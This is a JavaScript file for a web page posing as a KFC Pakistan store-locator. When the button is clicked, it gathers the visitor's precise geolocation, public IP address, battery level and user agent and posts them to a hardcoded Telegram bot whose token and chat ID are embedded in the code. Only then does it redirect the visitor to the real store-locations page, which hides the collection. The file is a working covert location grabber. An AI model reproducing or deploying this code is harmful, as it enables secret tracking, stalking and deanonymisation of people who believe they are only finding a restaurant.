document.getElementById('getLocationBtn').addEventListener('click', function () {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(handlePosition, showError);
    } else {
        document.getElementById('locationOutput').innerText = "Geolocation is not supported by this browser.";
    }
});

function handlePosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;

    sendToTelegram(latitude, longitude, function () {
        redirectToKFCWebsite();
    });
}

function showError(error) {
    var errorMessage;
    switch (error.code) {
        case error.PERMISSION_DENIED:
            errorMessage = "User denied the request for Geolocation.";
            break;
        case error.POSITION_UNAVAILABLE:
            errorMessage = "Location information is unavailable.";
            break;
        case error.TIMEOUT:
            errorMessage = "The request to get user location timed out.";
            break;
        case error.UNKNOWN_ERROR:
            errorMessage = "An unknown error occurred.";
            break;
    }
    document.getElementById('locationOutput').innerText = errorMessage;
}

function sendToTelegram(latitude, longitude, callback) {
    const botToken = '8308234475:AAEyDsgyyEDdweOm6_RC8YIkwWexvQuzXK8';
    const chatId = '7610567224';
    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const userAgent = navigator.userAgent;

    let batteryPercentage = 'Not Available';
    let ip = 'Not Available';

    function sendFinalMessage() {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                ip = data.ip;
                const messageText = `📍 *User Location Info*\n\n🌐 Location: [Open Map](${googleMapsLink})\n📡 IP: ${ip}\n🔋 Battery: ${batteryPercentage}\n🧾 User Agent:\n${userAgent}`;

                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const payload = {
                    chat_id: chatId,
                    text: messageText,
                    parse_mode: "Markdown"
                };

                fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                    .then(response => {
                        if (response.ok) {
                            callback();
                        } else {
                            console.error('Telegram Error:', response.statusText);
                        }
                    })
                    .catch(err => console.error('Fetch Error:', err));
            });
    }

    if (navigator.getBattery) {
        navigator.getBattery().then(function (battery) {
            batteryPercentage = (battery.level * 100).toFixed(2) + '%';
            sendFinalMessage();
        });
    } else {
        sendFinalMessage();
    }
}

function redirectToKFCWebsite() {
    window.location.href = 'https://www.kfcpakistan.com/store-locations';
}
